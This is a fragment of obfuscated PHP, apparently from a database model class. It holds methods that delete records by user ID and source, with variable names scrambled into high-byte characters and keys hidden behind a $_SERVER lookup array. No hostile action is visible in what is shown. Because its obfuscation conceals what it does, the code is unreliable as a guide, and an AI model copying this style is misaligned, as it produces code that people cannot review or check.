(!$ôÒŒÆŞ–) { return !1; } $¤¸À¾˜ = array($ª¾˜–Ë¾[1658] => USER_ID, $ª¾˜–Ë¾[484] => $ôÒŒÆŞ–); return $this->where($¤¸À¾˜)->delete(); } protected function removeBySource($Úµê‘Â§) { $™á±†Á =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($Úµê‘Â§)) { $Úµê‘Â§ = array($™á±†Á[7], $Úµê‘Â§); } $ãŠ»¿÷¸ = array($™á±†Á[1658] => USER_ID, $™á±†Á[484] => array($™á±†Á[1019], 0), $™á±†Á[421] => $Úµê‘Â§); return $this->where($ãŠ»¿÷¸)->delete(); } }